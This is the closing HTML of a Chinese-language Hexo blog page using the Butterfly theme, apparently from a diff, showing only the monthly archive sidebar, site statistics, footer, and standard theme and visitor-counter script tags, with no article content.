+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">106</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-15T05:56:43.525Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div><div class="card-widget user-map" id="user-map"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>訪客地圖</span></div><div class="item-content"></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
